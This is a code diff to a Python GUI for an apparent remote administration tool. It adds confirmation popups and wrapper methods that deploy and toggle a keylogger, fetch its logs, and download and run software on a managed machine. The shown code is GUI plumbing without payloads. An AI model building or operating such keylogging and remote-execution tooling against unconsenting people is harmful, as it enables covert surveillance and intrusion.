@@ -23,6 +23,7 @@ def Invoke(func: Callable, delay: float):
 
 # Popups Windows
 class Popups:
+    """A class that provides a syntactic wrapper for related static methods"""
     @staticmethod
     def savedLogs(root: customtkinter.CTk, saveDirectory:str = "PyRemoteClient/logs", geometry: str ="450x200"):
         def closeWindow():
@@ -37,6 +38,46 @@ class Popups:
         window.resizable(False, False)
 
         title = customtkinter.CTkLabel(window, text=f"File(s) Saved to: {saveDirectory}", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
+
+    #### Could possibly combine all these popups, at least the ones with repeating code ####
+
+    @staticmethod
+    def successfullyDownloaded(root: customtkinter.CTk, filename: str):
+        def closeWindow():
+            window.destroy()
+            window.update()
+
+        Invoke(closeWindow, 3)
+
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text=f"File Saved to: {filename}", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
+
+    @staticmethod
+    def successfullyDeployed(root: customtkinter.CTk):
+        def closeWindow():
+            window.destroy()
+            window.update()
+
+        Invoke(closeWindow, 3)
+
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text="Deployed!", font=customtkinter.CTkFont(size=20, weight="bold"))
         title.grid(row=0, column=0, padx=20, pady=10)
 
         quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
@@ -245,15 +286,22 @@ class App(customtkinter.CTk):
 
     """ Wrapper functions for admin tools to allow passthrough of arguements """
     def keyloggerDeployWrapper(self):
-        self.client.deployKeylogger()
+        status = self.client.deployKeylogger()
+        if status == "True":
+            self.adminFrame.keyloggerToggle.configure(text="Disable Keylogger")
+        else:
+            self.adminFrame.keyloggerToggle.configure(text="Enable Keylogger")
 
     def getKeyloggerOutputWrapper(self) -> None:
         Popups.savedLogs(self)
         return self.client.getKeyloggerOutput()
+
     def downloadSoftwareWrapper(self):
-        self.client.downloadSoftware(self.downloaderFrame.url.get())
+        filename = self.client.downloadSoftware(self.downloaderFrame.url.get())
+        Popups.successfullyDownloaded(self, filename)
 
     def deploySoftwareWrapper(self):
+        Popups.successfullyDeployed(self)
         self.client.deploySoftware(self.downloaderFrame.runargs.get())
 
     """ END WRAPPERS"""
